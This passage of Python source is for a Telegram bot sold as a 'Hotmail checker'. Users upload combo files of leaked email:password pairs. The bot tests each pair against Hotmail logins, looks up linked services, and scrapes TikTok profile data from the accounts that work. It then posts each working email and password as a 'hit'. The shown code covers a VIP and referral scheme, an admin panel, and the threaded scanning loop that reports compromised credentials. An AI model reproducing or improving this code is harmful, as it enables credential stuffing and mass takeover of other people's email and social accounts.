                    if not profile_data['verified']:
                        verified_match = re.search(r'"verified":(true|false)', html)
                        if verified_match:
                            profile_data['verified'] = verified_match.group(1) == 'true'
                    
                    return profile_data
            except:
                pass
            
            # Return basic data if profile fetch fails
            return {
                "has_tiktok": True,
                "tiktok_emails": tiktok_count,
                "username": username,
                "followers": 0,
                "following": 0,
                "videos": 0,
                "likes": 0,
                "verified": False
            }
            
        except:
            return None

# Start Command
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # Check if banned
    if is_banned(user_id):
        bot.send_message(message.chat.id,
                        f"❌ <b>You are banned by admin {MY_SIGNATURE}</b>\n\n"
                        f"Contact admin for more information.",
                        parse_mode='HTML')
        return
    
    # Check for referral code in /start command
    args = message.text.split()
    if len(args) > 1:
        ref_code = args[1]
        
        # Find referrer by referral code
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE referral_code = ?", (ref_code,))
        referrer = c.fetchone()
        conn.close()
        
        if referrer and referrer[0] != user_id:
            referrer_id = referrer[0]
            
            # Add new user first
            add_user(user_id, username)
            
            # Process referral
            if process_referral(user_id, referrer_id):
                # Notify referrer
                try:
                    bot.send_message(referrer_id,
                                   f"🎉 <b>New Referral!</b>\n\n"
                                   f"User <code>{user_id}</code> joined via your link!\n\n"
                                   f"✅ You got <b>+1 hour VIP!</b>\n"
                                   f"⏱ Check /referral for details",
                                   parse_mode='HTML')
                except:
                    pass
    
    add_user(user_id, username)
    
    admin_badge = "🔧 ADMIN" if user_id == ADMIN_ID else ""
    vip_status = '👑 VIP Member' if is_vip(user_id) else '⭐ Free User'
    
    welcome_text = f"""
⚡ <b>Skyline HOTMAIL Checker</b> {admin_badge}

🔥 <b>Advanced Hotmail checker</b>
⚡ Lightning-fast validation
🎯 60+ Services supported
🤖 AI Platforms (NEW!)
🎵 TikTok Full Capture (VIP)

👤 <b>Your Info:</b>
• ID: <code>{user_id}</code>
• Status: {vip_status}

📱 <b>Choose an option below:</b>

💎 <b>Created by {MY_SIGNATURE}</b>
🔗 <b>Channel:</b> {CHANNEL}
"""
    
    bot.send_message(message.chat.id, welcome_text, 
                    parse_mode='HTML',
                    reply_markup=main_menu_keyboard(user_id))

# Handle Main Menu Buttons
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text
    
    # Check if banned
    if is_banned(user_id):
        bot.send_message(message.chat.id,
                        f"❌ <b>You are banned by admin {MY_SIGNATURE}</b>\n\n"
                        f"Contact admin for more information.",
                        parse_mode='HTML')
        return
    
    if text == "📋 Start Scan":
        can, remaining = can_scan(user_id)
        if not can:
            bot.send_message(message.chat.id, 
                           f"⏳ <b>Rate Limit!</b>\n\n"
                           f"Free users can scan once per hour.\n"
                           f"⏰ Next scan available in: <b>{remaining}</b>\n\n"
                           f"💎 Upgrade to VIP for unlimited scans!",
                           parse_mode='HTML')
            return
        
        scan_text = """
⚡ <b>SELECT SCAN MODE</b>

Choose what to check:
"""
        bot.send_message(message.chat.id, scan_text, 
                        parse_mode='HTML',
                        reply_markup=scan_mode_keyboard(user_id))
    
    elif text == "📦 Multi Scan":
        if not is_vip(user_id):
            bot.send_message(message.chat.id, 
                           "👑 <b>VIP Feature Only!</b>\n\n"
                           "Multi Scan is available for VIP members only.",
                           parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, 
                           "📦 <b>Multi Scan Mode</b>\n\n"
                           "Send multiple combo files (up to 5)",
                           parse_mode='HTML')
    
    elif text == "📊 My Stats":
        user = get_user(user_id)
        if user:
            stats_text = f"""
📊 <b>Your Statistics</b>

👤 <b>User Info:</b>
• ID: <code>{user[0]}</code>
• Username: @{user[1] or 'N/A'}
• Status: {'👑 VIP' if user[2] else '⭐ Free'}
• Joined: {user[12][:10] if user[12] else 'N/A'}

📈 <b>Scan History:</b>
• Total Scans: {user[10] or 0}
• Total Hits: {user[11] or 0}

⏰ <b>Last Scan:</b>
{user[9][:19] if user[9] else 'Never'}

💎 <b>Created by {MY_SIGNATURE}</b>
"""
            bot.send_message(message.chat.id, stats_text, parse_mode='HTML')
    
    elif text == "👑 Membership":
        user = get_user(user_id)
        if user and user[2]:
            vip_until = user[3]
            if vip_until == "Forever":
                expiry = "♾️ Never (Lifetime VIP)"
            else:
                expiry = vip_until[:19]
            
            membership_text = f"""
👑 <b>VIP MEMBERSHIP</b>

✅ <b>Status:</b> Active
⏰ <b>Valid Until:</b> {expiry}

🎁 <b>VIP Benefits:</b>
✅ Unlimited scans
✅ Multi-scan feature
✅ TikTok Full Capture
✅ Priority support

💎 <b>Created by {MY_SIGNATURE}</b>
"""
        else:
            membership_text = f"""
⭐ <b>FREE MEMBERSHIP</b>

📊 <b>Current Plan:</b> Free User

📋 <b>Free Features:</b>
✅ 1 scan per hour
✅ All scan modes
✅ AI Platforms check

👑 <b>VIP Benefits:</b>
💎 Unlimited scans
💎 TikTok Full Capture
💎 Multi-scan feature

📞 <b>Contact admin to upgrade!</b>

💎 <b>Created by {MY_SIGNATURE}</b>
"""
        bot.send_message(message.chat.id, membership_text, parse_mode='HTML')
    
    elif text == "🔗 My Referral":
        user = get_user(user_id)
        if user:
            ref_code = user[6]  # referral_code
            ref_count = user[8]  # referrals_count
            
            # Get bot username
            bot_info = bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start={ref_code}"
            
            # Create share button
            markup = types.InlineKeyboardMarkup()
            share_btn = types.InlineKeyboardButton(
                "📤 Share Link", 
                url=f"https://t.me/share/url?url={urllib.parse.quote(ref_link)}&text={urllib.parse.quote('Join the best Hotmail checker bot!')}"
            )
            markup.add(share_btn)
            
            referral_text = f"""
🔗 <b>Your Referral System</b>

👥 <b>How it works:</b>
Share your link and get <b>+1 hour VIP</b> per new user!

🎯 <b>Your Referral Link:</b>
<code>{ref_link}</code>

📊 <b>Your Stats:</b>
• Total Referrals: <b>{ref_count}</b> users
• VIP Earned: <b>{ref_count}</b> hour(s)

💡 <b>Tip:</b>
Share the link on social media to get more referrals!

💎 <b>{MY_SIGNATURE}</b>
"""
            bot.send_message(message.chat.id, referral_text, 
                           parse_mode='HTML',
                           reply_markup=markup)
        return  # IMPORTANT: Stop here to prevent repeating!
    
    elif text == "📞 Support":
        support_text = f"""
📞 <b>SUPPORT</b>

💬 <b>Contact Developer:</b>
• Telegram: {MY_SIGNATURE}
• Channel: {CHANNEL}

💎 <b>Created by {MY_SIGNATURE}</b>
"""
        bot.send_message(message.chat.id, support_text, parse_mode='HTML')
    
    elif text == "🔧 Admin Panel":
        if user_id != ADMIN_ID:
            bot.send_message(message.chat.id, 
                           "❌ <b>Access Denied!</b>",
                           parse_mode='HTML')
            return
        
        admin_text = """
🔧 <b>ADMIN PANEL</b>

Select an option:
"""
        bot.send_message(message.chat.id, admin_text, 
                        parse_mode='HTML',
                        reply_markup=admin_panel_keyboard())

# Handle Callback Queries
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    # Check if banned
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ You are banned!", show_alert=True)
        return
    
    # Admin protection
    if call.data.startswith("admin_") and user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Access Denied! Admin only.", show_alert=True)
        return
    
    # VIP Required
    if call.data == "vip_required":
        bot.answer_callback_query(call.id, "👑 VIP membership required!", show_alert=True)
        return
    
    # VIP Forever Required (for TikTok)
    if call.data == "vip_forever_required":
        bot.answer_callback_query(call.id, "👑 VIP Forever membership required for TikTok Full Capture!", show_alert=True)
        return
    
    # Stop Scan
    if call.data.startswith("stop_scan_"):
        scan_user_id = int(call.data.replace("stop_scan_", ""))
        if scan_user_id == user_id or user_id == ADMIN_ID:
            if scan_user_id in active_scans:
                active_scans[scan_user_id] = False
                bot.answer_callback_query(call.id, "⏹ Scan stopped!", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "No active scan found", show_alert=True)
        return
    
    # Scan Mode Selection
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        
        # Handle single platform selection
        if mode == "single_platform":
            bot.edit_message_text(
                "🎯 <b>Select Single Platform</b>\n\n"
                "Choose ONE platform to check:",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML',
                reply_markup=single_platform_keyboard()
            )
            return
        
        # Store mode
        user_sessions[user_id] = {"mode": mode}
        
        description = get_mode_description(mode)
        
        if mode == "custom":
            bot.edit_message_text(
                description +
                f"\n\n📝 <b>Send the domain name:</b>\n"
                f"Example: netflix.com",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML'
            )
            bot.register_next_step_handler(call.message, process_custom_domain)
        else:
            bot.edit_message_text(
                description +
                f"\n\n📁 <b>Now send your combo file</b>\n"
                f"Format: email:password",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML'
            )
    
    # Platform Selection (for single platform mode)
    if call.data.startswith("platform_"):
        platform_name = call.data.replace("platform_", "")
        
        # Store mode as "single" and the platform
        user_sessions[user_id] = {
            "mode": "single",
            "platform": platform_name
        }
        
        bot.edit_message_text(
            f"✅ <b>Selected: {platform_name}</b>\n\n"
            f"Will check {platform_name} only!\n\n"
            f"📁 <b>Now send combo file</b>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        return
    
    # Back to scan modes
    if call.data == "back_to_scan_modes":
        bot.edit_message_text(
            "⚡ <b>SELECT SCAN MODE</b>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=scan_mode_keyboard(user_id)
        )
        return
    
    # Admin Panel Callbacks
    elif call.data == "admin_panel":
        bot.edit_message_text(
            "🔧 <b>ADMIN PANEL</b>\n\nSelect an option:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=admin_panel_keyboard()
        )
    
    elif call.data == "admin_add_vip":
        bot.edit_message_text(
            "➕ <b>ADD VIP MEMBER</b>\n\n"
            "Send the user ID\n\n"
            "Example: 123456789",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_add_vip_step1)
    
    elif call.data == "admin_remove_vip":
        bot.edit_message_text(
            "➖ <b>REMOVE VIP</b>\n\n"
            "Send the user ID",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_remove_vip)
    
    elif call.data == "admin_list_vips":
        vips = get_all_vips()
        
        if not vips:
            vip_text = "📋 <b>VIP MEMBERS</b>\n\n❌ No VIP members"
        else:
            vip_text = "📋 <b>VIP MEMBERS</b>\n\n"
            for i, vip in enumerate(vips, 1):
                vip_text += f"{i}. <code>{vip[0]}</code> @{vip[1] or 'N/A'}\n"
                vip_text += f"   Until: {vip[2]}\n\n"
        
        bot.edit_message_text(vip_text, 
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())
    
    elif call.data == "admin_ban_user":
        bot.edit_message_text(
            "🚫 <b>BAN USER</b>\n\n"
            "Send the user ID to ban\n\n"
            "Example: 123456789",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_ban_user)
    
    elif call.data == "admin_unban_user":
        bot.edit_message_text(
            "✅ <b>UNBAN USER</b>\n\n"
            "Send the user ID to unban",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_unban_user)
    
    elif call.data == "admin_banned_list":
        banned = get_banned_users()
        
        if not banned:
            ban_text = "📋 <b>BANNED USERS</b>\n\n❌ No banned users"
        else:
            ban_text = "📋 <b>BANNED USERS</b>\n\n"
            for i, user in enumerate(banned, 1):
                ban_text += f"{i}. <code>{user[0]}</code> @{user[1] or 'N/A'}\n"
                ban_text += f"   Reason: {user[2] or 'N/A'}\n\n"
        
        bot.edit_message_text(ban_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())
    
    elif call.data == "admin_stats":
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
        total_vips = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
        total_banned = c.fetchone()[0]
        
        c.execute("SELECT SUM(total_scans) FROM users")
        total_scans = c.fetchone()[0] or 0
        
        c.execute("SELECT SUM(total_hits) FROM users")
        total_hits = c.fetchone()[0] or 0
        
        conn.close()
        
        # Create buttons for viewing users
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("📋 View Free Users", callback_data="view_free_users")
        btn2 = types.InlineKeyboardButton("👑 View VIP Users", callback_data="view_vip_users")
        btn3 = types.InlineKeyboardButton("🚫 View Banned Users", callback_data="admin_banned_list")
        btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        markup.add(btn1, btn2, btn3, btn_back)
        
        stats_text = f"""
📊 <b>BOT STATISTICS</b>

👥 <b>Users:</b>
• Total: {total_users}
• Free: {total_users - total_vips - total_banned}
• VIP: {total_vips}
• Banned: {total_banned}

📈 <b>Activity:</b>
• Total Scans: {total_scans}
• Total Hits: {total_hits}

💎 <b>Created by {MY_SIGNATURE}</b>
"""
        
        bot.edit_message_text(stats_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=markup)
    
    elif call.data == "admin_broadcast":
        # Broadcast menu
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("📤 Send to All Users", callback_data="broadcast_all")
        btn2 = types.InlineKeyboardButton("👤 Send to One User", callback_data="broadcast_one")
        btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        markup.add(btn1, btn2, btn_back)
        
        bot.edit_message_text(
            "📢 <b>BROADCAST MESSAGE</b>\n\n"
            "Choose broadcast type:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )
    
    elif call.data == "broadcast_all":
        bot.edit_message_text(
            "📤 <b>BROADCAST TO ALL USERS</b>\n\n"
            "Send the message you want to broadcast\n\n"
            "⚠️ This will be sent to ALL users!",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_broadcast_all)
    
    elif call.data == "broadcast_one":
        bot.edit_message_text(
            "👤 <b>SEND TO ONE USER</b>\n\n"
            "Send the user ID\n\n"
            "Example: 123456789",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_broadcast_one_step1)
    
    elif call.data == "view_free_users":
        free_users = get_free_users()
        
        if not free_users:
            user_text = "📋 <b>FREE USERS</b>\n\n❌ No free users"
        else:
            user_text = f"📋 <b>FREE USERS</b> ({len(free_users)} total)\n\n"
            for i, user in enumerate(free_users[:20], 1):  # Show first 20
                user_text += f"{i}. <code>{user[0]}</code> @{user[1] or 'N/A'}\n"
            
            if len(free_users) > 20:
                user_text += f"\n... and {len(free_users) - 20} more"
        
        bot.edit_message_text(user_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())
    
    elif call.data == "view_vip_users":
        vips = get_all_vips()
        
        if not vips:
            vip_text = "📋 <b>VIP USERS</b>\n\n❌ No VIP users"
        else:
            vip_text = f"📋 <b>VIP USERS</b> ({len(vips)} total)\n\n"
            for i, vip in enumerate(vips, 1):
                vip_text += f"{i}. <code>{vip[0]}</code> @{vip[1] or 'N/A'}\n"
                vip_text += f"   Until: {vip[2]}\n\n"
        
        bot.edit_message_text(vip_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())
    
    elif call.data == "back_main":
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    # VIP Duration
    elif call.data.startswith("vip_duration_"):
        duration = call.data.replace("vip_duration_", "")
        
        if hasattr(bot, 'pending_vip_user'):
            target_user_id = bot.pending_vip_user
            target_username = bot.pending_vip_username
            
            add_vip(target_user_id, target_username, duration)
            
            duration_text = {
                "1h": "1 Hour",
                "1d": "1 Day",
                "1w": "1 Week",
                "1m": "1 Month",
                "forever": "Forever"
            }
            
            bot.edit_message_text(
                f"✅ <b>VIP Added!</b>\n\n"
                f"User: <code>{target_user_id}</code>\n"
                f"Duration: {duration_text.get(duration, 'Unknown')}",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML',
                reply_markup=admin_panel_keyboard()
            )
            
            try:
                bot.send_message(target_user_id,
                               f"🎉 <b>Congratulations!</b>\n\n"
                               f"You're now VIP!\n"
                               f"Duration: {duration_text.get(duration, 'Unknown')}",
                               parse_mode='HTML')
            except:
                pass
            
            delattr(bot, 'pending_vip_user')
            delattr(bot, 'pending_vip_username')

# Admin Handlers
def process_add_vip_step1(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        target_user_id = int(message.text.strip())
        
        bot.pending_vip_user = target_user_id
        bot.pending_vip_username = "Unknown"
        
        bot.send_message(message.chat.id,
                        f"✅ User: <code>{target_user_id}</code>\n\n"
                        f"Select duration:",
                        parse_mode='HTML',
                        reply_markup=vip_duration_keyboard())
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid User ID!")

def process_remove_vip(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        target_user_id = int(message.text.strip())
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ User not found!")
            return
        
        if user[2] == 0:
            bot.send_message(message.chat.id, "❌ User is not VIP!")
            return
        
        remove_vip(target_user_id)
        
        bot.send_message(message.chat.id,
                        f"✅ VIP Removed!\n\n"
                        f"User <code>{target_user_id}</code> is now free.",
                        parse_mode='HTML')
        
        try:
            bot.send_message(target_user_id,
                           "⚠️ Your VIP membership has been removed.")
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid User ID!")

def process_ban_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        target_user_id = int(message.text.strip())
        
        if target_user_id == ADMIN_ID:
            bot.send_message(message.chat.id, "❌ Cannot ban admin!")
            return
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ User not found!")
            return
        
        ban_user(target_user_id, "Banned by admin")
        
        bot.send_message(message.chat.id,
                        f"✅ User Banned!\n\n"
                        f"<code>{target_user_id}</code> is now banned.",
                        parse_mode='HTML')
        
        try:
            bot.send_message(target_user_id,
                           f"❌ <b>You are banned by admin {MY_SIGNATURE}</b>\n\n"
                           f"Contact admin for more information.",
                           parse_mode='HTML')
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid User ID!")

def process_unban_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        target_user_id = int(message.text.strip())
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ User not found!")
            return
        
        if user[4] == 0:
            bot.send_message(message.chat.id, "❌ User is not banned!")
            return
        
        unban_user(target_user_id)
        
        bot.send_message(message.chat.id,
                        f"✅ User Unbanned!\n\n"
                        f"<code>{target_user_id}</code> can now use the bot.",
                        parse_mode='HTML')
        
        try:
            bot.send_message(target_user_id,
                           "✅ You have been unbanned! Welcome back!")
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid User ID!")

def process_broadcast_all(message):
    """Process broadcast to all users"""
    broadcast_text = message.text
    
    # Get all users
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE is_banned = 0")
    users = c.fetchall()
    conn.close()
    
    if not users:
        bot.send_message(message.chat.id, "❌ No users found!")
        return
    
    # Send to all users
    success = 0
    failed = 0
    
    status_msg = bot.send_message(message.chat.id, 
                                  f"📤 Broadcasting...\n\n"
                                  f"Progress: 0/{len(users)}")
    
    for i, user in enumerate(users, 1):
        user_id = user[0]
        try:
            bot.send_message(user_id, 
                           f"📢 <b>Message from Admin</b>\n\n{broadcast_text}",
                           parse_mode='HTML')
            success += 1
        except:
            failed += 1
        
        # Update progress every 10 users
        if i % 10 == 0:
            try:
                bot.edit_message_text(
                    f"📤 Broadcasting...\n\n"
                    f"Progress: {i}/{len(users)}\n"
                    f"✅ Success: {success}\n"
                    f"❌ Failed: {failed}",
                    message.chat.id,
                    status_msg.message_id
                )
            except:
                pass
    
    # Final result
    bot.edit_message_text(
        f"✅ <b>Broadcast Complete!</b>\n\n"
        f"📊 Results:\n"
        f"• Total Users: {len(users)}\n"
        f"• Success: {success}\n"
        f"• Failed: {failed}",
        message.chat.id,
        status_msg.message_id,
        parse_mode='HTML'
    )

def process_broadcast_one_step1(message):
    """Get user ID for single broadcast"""
    try:
        target_user_id = int(message.text.strip())
        
        # Check if user exists
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ User not found!")
            return
        
        # Store target user ID in session
        user_sessions[message.from_user.id] = {"broadcast_target": target_user_id}
        
        bot.send_message(message.chat.id,
                        f"👤 <b>Send to User: {target_user_id}</b>\n\n"
                        f"Now send the message:",
                        parse_mode='HTML')
        
        bot.register_next_step_handler(message, process_broadcast_one_step2)
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid User ID!")

def process_broadcast_one_step2(message):
    """Send message to single user"""
    broadcast_text = message.text
    target_user_id = user_sessions.get(message.from_user.id, {}).get("broadcast_target")
    
    if not target_user_id:
        bot.send_message(message.chat.id, "❌ Error: Target user not found in session!")
        return
    
    try:
        bot.send_message(target_user_id,
                       f"📢 <b>Message from Admin</b>\n\n{broadcast_text}",
                       parse_mode='HTML')
        
        bot.send_message(message.chat.id,
                        f"✅ Message sent to user {target_user_id}!",
                        parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id,
                        f"❌ Failed to send message!\n\n"
                        f"Error: {str(e)}",
                        parse_mode='HTML')

def process_custom_domain(message):
    user_id = message.from_user.id
    custom_domain = message.text.strip()
    
    if user_id in user_sessions:
        user_sessions[user_id]["custom_domain"] = custom_domain
    
    bot.send_message(message.chat.id,
                    f"✅ <b>Domain: {custom_domain}</b>\n\n"
                    f"Now send your combo file!",
                    parse_mode='HTML')

# Handle File Uploads
@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    
    # Check if banned
    if is_banned(user_id):
        bot.send_message(message.chat.id,
                        f"❌ You are banned!",
                        parse_mode='HTML')
        return
    
    can, remaining = can_scan(user_id)
    if not can:
        bot.send_message(message.chat.id,
                        f"⏳ <b>Rate Limit!</b>\n\n"
                        f"Next scan in: <b>{remaining}</b>",
                        parse_mode='HTML')
        return
    
    # Download file
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    # Save file
    file_path = f"temp_{user_id}.txt"
    with open(file_path, 'wb') as f:
        f.write(downloaded_file)
    
    # Update last scan time
    update_last_scan(user_id)
    
    # Get scan mode
    scan_mode = user_sessions.get(user_id, {}).get("mode", "all")
    custom_domain = user_sessions.get(user_id, {}).get("custom_domain", "")
    
    bot.send_message(message.chat.id,
                    "🚀 <b>Scan Started!</b>\n\n"
                    "Processing your combo file...",
                    parse_mode='HTML')
    
    # Start scanning
    threading.Thread(target=start_real_scan, 
                    args=(user_id, file_path, message.chat.id, scan_mode, custom_domain)).start()

def start_real_scan(user_id, file_path, chat_id, scan_mode, custom_domain=""):
    """Real scanning process with STOP button"""
    
    # Mark scan as active
    active_scans[user_id] = True
    
    # Read combos
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line]
    except:
        bot.send_message(chat_id, "❌ Error reading file!")
        active_scans[user_id] = False
        return
    
    total = len(lines)
    hits = 0
    bad = 0
    retry_count = 0
    linked_total = 0
    all_hits = []
    
    # Determine services
    if scan_mode == "gaming":
        services_to_check = SERVICES_GAMING
    elif scan_mode == "social":
        services_to_check = SERVICES_SOCIAL
    elif scan_mode == "streaming":
        services_to_check = SERVICES_STREAMING
    elif scan_mode == "ai":
        services_to_check = SERVICES_AI
    elif scan_mode == "tiktok":
        services_to_check = None  # Special handling for TikTok
    elif scan_mode == "single":
        # Single platform mode - get platform from session
        platform_name = user_sessions.get(user_id, {}).get("platform", "")
        if platform_name:
            # Find the platform's email in all services
            platform_email = None
            for service_name, email in SERVICES_ALL.items():
                if service_name == platform_name:
                    platform_email = email
                    break
            
            if platform_email:
                services_to_check = {platform_name: platform_email}
            else:
                services_to_check = SERVICES_ALL
        else:
            services_to_check = SERVICES_ALL
    else:
        services_to_check = SERVICES_ALL
    
    # Send progress with STOP button
    progress_msg = bot.send_message(chat_id,
                                   "⚡ <b>CHECKING IN PROGRESS</b>\n\n"
                                   "✅ Hits: 0\n"
                                   "❌ Bad: 0\n"
                                   "🔄 Retry: 0\n"
                                   "🔗 Linked: 0\n\n"
                                   "━━━━━━━━━━━━━━━━━━━━\n"
                                   f"📊 Progress: 0/{total} (0%)\n\n"
                                   "🔍 Current: Starting...",
                                   parse_mode='HTML',
                                   reply_markup=stop_scan_keyboard(user_id))
    
    # PIN the message
    try:
        bot.pin_chat_message(chat_id, progress_msg.message_id, disable_notification=True)
    except:
        pass
    
    start_time = time.time()
    
    for i, line in enumerate(lines):
        # Check if scan was stopped
        if not active_scans.get(user_id, False):
            bot.send_message(chat_id, "⏹ <b>Scan Stopped by User</b>", parse_mode='HTML')
            break
        
        try:
            if ':' not in line:
                continue
            
            parts = line.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            
            # Check account
            result = HotmailChecker.check_account(email, password)
            
            if result["status"] == "HIT":
                hits += 1
                
                if scan_mode == "tiktok":
                    # TikTok Full Capture
                    tiktok_data = HotmailChecker.check_tiktok_full(
                        email, password,
                        result["token"],
                        result["cid"]
                    )
                    
                    if tiktok_data:
                        all_hits.append({
                            "email": email,
                            "password": password,
                            "services": [f"TikTok (@{tiktok_data['username']})"]
                        })
                        
                        # Format the hit message with ALL data
                        verified_emoji = "✅" if tiktok_data.get('verified', False) else "❌"
                        
                        hit_msg = f"""
━━━━━━━━━━━━━━━━━━━━
⚡ TIKTOK HIT FOUND #{hits}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

🎵 <b>TikTok Full Data:</b>
👤 Username: @{tiktok_data['username']}
👥 Followers: {format_number(tiktok_data.get('followers', 0))}
➕ Following: {format_number(tiktok_data.get('following', 0))}
📹 Videos: {tiktok_data.get('videos', 0)}
❤️ Likes: {format_number(tiktok_data.get('likes', 0))}
{verified_emoji} Verified: {tiktok_data.get('verified', False)}
📧 TikTok Emails: {tiktok_data['tiktok_emails']}

━━━━━━━━━━━━━━━━━━━━
💎 Created by {MY_SIGNATURE}
"""
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
                    else:
                        # No TikTok data but still a hit
                        all_hits.append({
                            "email": email,
                            "password": password,
                            "services": []
                        })
                        
                        hit_msg = f"""
━━━━━━━━━━━━━━━━━━━━
⚡ NEW HIT FOUND #{hits}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

━━━━━━━━━━━━━━━━━━━━
💎 Created by {MY_SIGNATURE}
"""
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
                else:
                    # Regular service check
                    found_services = HotmailChecker.check_services(
                        email, password,
                        result["token"],
                        result["cid"],
                        services_to_check
                    )
                    
                    linked_total += len(found_services)
                    
                    all_hits.append({
                        "email": email,
                        "password": password,
                        "services": found_services
                    })
                    
                    # ALWAYS send hit message, even if no services found
                    if found_services:
                        services_text = "\n".join([f"✅ {s}" for s in found_services])
                        hit_msg = f"""
━━━━━━━━━━━━━━━━━━━━
⚡ NEW HIT FOUND #{hits}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

🔗 Linked Services:
{services_text}

━━━━━━━━━━━━━━━━━━━━
💎 Created by {MY_SIGNATURE}
"""
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
                    else:
                        # No services but still a valid hit
                        hit_msg = f"""
━━━━━━━━━━━━━━━━━━━━
⚡ NEW HIT FOUND #{hits}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

⚠️ No linked services found

━━━━━━━━━━━━━━━━━━━━
💎 Created by {MY_SIGNATURE}
"""
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
            
            elif result["status"] == "RETRY":
                retry_count += 1
            else:
                bad += 1
            
            # Update progress every 5 checks
            if i % 5 == 0 or i == total - 1:
                elapsed = time.time() - start_time
                cpm = int((i / elapsed * 60)) if elapsed > 0 else 0
                progress = (i / total * 100)
                
                try:
                    bot.edit_message_text(
                        f"⚡ <b>CHECKING IN PROGRESS</b>\n\n"
                        f"✅ Hits: {hits}\n"
                        f"❌ Bad: {bad}\n"
                        f"🔄 Retry: {retry_count}\n"
                        f"🔗 Linked: {linked_total}\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📊 Progress: {i+1}/{total} ({progress:.1f}%)\n"
                        f"⏱ Speed: {cpm} CPM\n\n"
                        f"🔍 Current: {email}",
                        chat_id,
                        progress_msg.message_id,
                        parse_mode='HTML',
                        reply_markup=stop_scan_keyboard(user_id)
                    )
                except:
                    pass
            
            time.sleep(0.1)
            
        except Exception as e:
            bad += 1
            continue
    
    # Unpin
    try:
        bot.unpin_chat_message(chat_id, progress_msg.message_id)
    except:
        pass
    
    # Create hits file(s) - separate file for each service
    if all_hits:
        # Group hits by service
